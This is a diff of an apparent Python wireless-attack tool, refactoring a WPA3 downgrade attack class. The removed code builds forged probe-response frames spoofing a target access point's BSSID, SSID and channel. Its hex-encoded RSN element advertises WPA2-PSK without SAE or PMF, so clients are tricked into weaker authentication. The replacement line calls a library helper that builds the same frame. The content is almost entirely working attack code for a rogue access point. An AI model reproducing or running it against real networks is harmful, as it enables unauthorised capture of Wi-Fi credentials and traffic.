@@ -19,34 +19,16 @@ from __future__ import annotations
 
 import asyncio
 import logging
-import struct
 import time
 from dataclasses import dataclass, field
 from typing import Callable, Optional
 
 from wifit3.models import AccessPoint
+from wifit3.dot11.probe import probe_resp
 
 from .campaign import Campaign
 
 logger = logging.getLogger(__name__)
-
-
-# Generic WPA2-PSK-CCMP RSN IE — no PMF, no SAE AKM. This is what we want the
-# client to think the AP supports for this session.
-#   30 14                              tag 48, length 20
-#   01 00                              RSN version 1
-#   00 0f ac 04                        group cipher = CCMP
-#   01 00 00 0f ac 04                  1 pairwise cipher = CCMP
-#   01 00 00 0f ac 02                  1 AKM = PSK (2). NOT SAE (8).
-#   00 00                              RSN capabilities = 0 (no PMF)
-_DOWNGRADE_RSN_IE = bytes.fromhex("30140100000fac040100000fac040100000fac020000")
-
-# Standard supported-rates IEs.
-_SUPPORTED_RATES = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
-_EXT_SUPPORTED_RATES = bytes([0x30, 0x48, 0x60, 0x6C])
-
-# Capability Info: ESS + Privacy + Short Slot Time.
-_CAPABILITY_INFO = 0x0411
 
 
 def _mac_str(b: bytes) -> str:
@@ -106,40 +88,7 @@ class WPA3DowngradeAttack(Campaign):
         self._bssid_bytes = _str_to_mac(target.bssid)
         # Pre-built template with a 6-byte placeholder for Addr1 (dest = client).
         # Per-probe work is just splicing in the client MAC + sending.
-        self._template = self._build_probe_response_template()
-
-    # -- Frame builder --------------------------------------------------------
-
-    def _build_probe_response_template(self) -> bytes:
-        """Build the probe-response frame with Addr1 left blank.
-
-        Layout: 24B MAC header + 12B fixed params + tagged params. Addr1
-        (bytes 4..10) is the placeholder — splice in the client MAC per probe.
-        """
-        fc = b"\x50\x00"
-        duration = b"\x00\x00"
-        addr1_placeholder = b"\x00" * 6
-        addr2 = self._bssid_bytes
-        addr3 = self._bssid_bytes
-        seq_ctrl = b"\x00\x00"
-        mac_header = fc + duration + addr1_placeholder + addr2 + addr3 + seq_ctrl
-
-        # Fixed params: TSF timestamp (8B), beacon interval (2B), capabilities (2B).
-        # Most clients ignore timestamp until associated; current epoch in µs is fine.
-        timestamp = struct.pack("<Q", int(time.time() * 1_000_000))
-        beacon_interval = struct.pack("<H", 100)  # 100 TU ≈ 102.4 ms
-        capability = struct.pack("<H", _CAPABILITY_INFO)
-        fixed = timestamp + beacon_interval + capability
-
-        # Tagged params: SSID, Supported Rates, DS Param Set, Ext Rates, RSN (WPA2-only).
-        ssid_ie = bytes([0x00, len(self._target_ssid_bytes)]) + self._target_ssid_bytes
-        rates_ie = bytes([0x01, len(_SUPPORTED_RATES)]) + _SUPPORTED_RATES
-        ds_param_ie = bytes([0x03, 0x01, self.target.channel & 0xFF])
-        ext_rates_ie = bytes([0x32, len(_EXT_SUPPORTED_RATES)]) + _EXT_SUPPORTED_RATES
-        rsn_ie = _DOWNGRADE_RSN_IE
-
-        tags = ssid_ie + rates_ie + ds_param_ie + ext_rates_ie + rsn_ie
-        return mac_header + fixed + tags
+        self._template = probe_resp(self._bssid_bytes, self.target.ssid, self.target.channel)
 
     # -- Lifecycle ------------------------------------------------------------
 
